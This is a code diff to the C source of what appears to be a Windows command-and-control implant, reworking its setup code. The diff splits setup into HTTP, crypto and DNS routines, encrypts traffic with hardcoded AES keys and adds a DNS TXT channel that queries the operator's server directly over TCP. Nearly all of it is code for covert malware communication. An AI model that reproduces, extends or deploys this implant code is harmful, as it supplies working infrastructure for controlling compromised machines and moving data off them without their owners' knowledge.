@@ -42,12 +42,17 @@
 // Function declarations
 // -----------------------------------------------------------------------
 int SetupComms();
+int SetupHTTP();
+int SetupCrypto();
+int SetupDNS();
 void TearDownComms();
 void ResetHTTPHandle();
+
 char* base64(char* input, int len);
 char* unbase64(char* buffer, int len, int* outLen);
 char* Encrypt(char* msg, int len, int* pOutLen);
 char* Decrypt(char* ciphertext, int len, int* pOutLen);
+
 void c2_log(const char* format, ...);
 int c2_send(char* buffer, int len);
 int c2_send_body(char* buffer, int len);
@@ -64,10 +69,15 @@ const wchar_t* C2_USER_AGENT   = L"TESTNG AGENT";
 char           C2_AES_KEY[16]  = { 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A' };
 char           C2_AES_IV[16]   = { 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A', 'A' };
 
-// Global handles for communication
+// Global variables for communication
+// ------------------------------------
+// HTTP
 HINTERNET hSession       = NULL;
 HINTERNET hConnect       = NULL;
 HINTERNET hRequest       = NULL;
+// DNS
+PIP4_ARRAY pSrvList      = NULL;
+// Crypto
 BCRYPT_ALG_HANDLE hCrypt = NULL;
 BCRYPT_KEY_HANDLE hKey   = NULL;
 
@@ -79,11 +89,62 @@ HANDLE HEAP;
 #define Free(ptr) HeapFree(HEAP, 0, (ptr));
 
 
-// Sets up global HTTP connection handlers.
+// Sets up global variables for network communication.
 // Returns 0 on success and -1 on failure.
 int SetupComms() {
     NTSTATUS status;
 
+    // Set heap handle
+    HEAP = GetProcessHeap();
+    if (! HEAP) {
+        c2_log("[!] SetupComms:GetProcessHeap failed with status %d\n", GetLastError());
+        return -1;
+    }
+
+    status = SetupHTTP();
+    if (status < 0) {
+        c2_log("[!] SetupComms:SetupHTTP failed\n");
+        return -1;
+    }
+
+    status = SetupCrypto();
+    if (status < 0) {
+        c2_log("[!] SetupComms:SetupCrypto failed\n");
+        return -1;
+    }
+
+    status = SetupDNS();
+    if (status < 0) {
+        c2_log("[!] SetupComms:SetupDNS failed\n");
+        return -1;
+    }
+
+    return 0;
+}
+
+
+// Sets up server list so we can make repeated DNS queries without recreating the list every time.
+int SetupDNS() {
+    int numerical_ip = 0;
+
+    pSrvList = (PIP4_ARRAY) Malloc(32); // 32 bytes should be enough...hopefully
+    if (pSrvList == NULL) {
+        c2_log("[!] SetupDNS:Malloc failed\n");
+        return -1;
+    }
+
+    pSrvList->AddrCount = 1;
+    if (InetPtonW(AF_INET, C2_IP, &numerical_ip) != 1) {
+        c2_log("[!] SetupDNS:InetPtonW failed\n");
+        return -1;
+    }
+    pSrvList->AddrArray[0] = numerical_ip;
+    return 0;
+}
+
+
+// Sets up HTTP context so we can make HTTP requests.
+int SetupHTTP() {
     // Setup HTTP context
     HINTERNET hSession = WinHttpOpen(C2_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if(! hSession) {
@@ -102,15 +163,15 @@ int SetupComms() {
     DWORD option = WINHTTP_DISABLE_COOKIES;
     WinHttpSetOption(hConnect, WINHTTP_OPTION_DISABLE_FEATURE, &option, sizeof(option));
 
-    // Set heap handle
-    HEAP = GetProcessHeap();
-    if (! HEAP) {
-        c2_log("[!] SetupComms:GetProcessHeap failed with status %d\n", GetLastError());
-        return -1;
-    }
+    return 0;
+}
 
-    // Setup encryption context
-    // TODO: maybe negotioate Diffie-Hellman key exchange rather than hard coding key
+
+// Set up encryption context and algos.
+// TODO: maybe negotioate Diffie-Hellman key exchange rather than hardcoding key
+int SetupCrypto() {
+    NTSTATUS status;
+
     status = BCryptOpenAlgorithmProvider(&hCrypt, BCRYPT_AES_ALGORITHM, NULL, 0);
     if (status != STATUS_SUCCESS) {
         c2_log("[!] SetupComms:BCryptOpenAlgorithmProvider failed with status 0x%x\n", status);
@@ -130,13 +191,13 @@ int SetupComms() {
         c2_log("[!] SetupComms:BCryptGenerateSymmetricKey failed with status 0x%x\n", status);
         return -1;
     }
-
     return 0;
 }
 
 
 // Cleans up handles
 void TearDownComms() {
+    if (pSrvList)   {Free(pSrvList);}
     if (hKey)       {BCryptDestroyKey(hKey);}
     if (hCrypt)     {BCryptCloseAlgorithmProvider(hCrypt, 0);}
     if (hRequest)   {WinHttpCloseHandle(hRequest);}
@@ -414,38 +475,15 @@ int c2_send(char* data, int len) {
 // TODO: needs lots of clean up
 // TODO: need to rename this too
 int c2_send2(char* msg, int len) {
-
     DNS_STATUS status;
-    DNS_ADDR_ARRAY addrArray   = {0};
     DNS_QUERY_REQUEST request  = {0};
     PDNS_RECORD result         = NULL;
-    struct sockaddr_in ip      = {0};
-
-    PDNS_RECORD pDnsRecord = NULL;
-    PIP4_ARRAY pSrvList = NULL;
-
-
-    pSrvList = (PIP4_ARRAY) Malloc(20);
-    pSrvList->AddrCount = 1;
-    int numerical_ip = 0;
-    if (InetPtonW(AF_INET, C2_IP, &numerical_ip) != 1) {
-        c2_log("[!] c2_send2:InetPtonW failed\n");
-        return 0;
-    }
-    pSrvList->AddrArray[0] = numerical_ip;
-
 
     status = DnsQuery_A("testtesttesttesttesttesttesttesttestte.com", DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_USE_TCP_ONLY, pSrvList, &result, NULL);
-    if (status == ERROR_INVALID_PARAMETER) {
-        c2_log("[!] dns invalid param\n");
-        return 0;
-    }
     if (status != ERROR_SUCCESS && status != DNS_INFO_NO_RECORDS) {
         c2_log("[!] c2_send2:DnsQuery_A failed with status %d\n", status);
         return 0;
     }
-
-    Free(pSrvList);
 
     // TODO actually process result
     c2_log("[+] DNS query success");
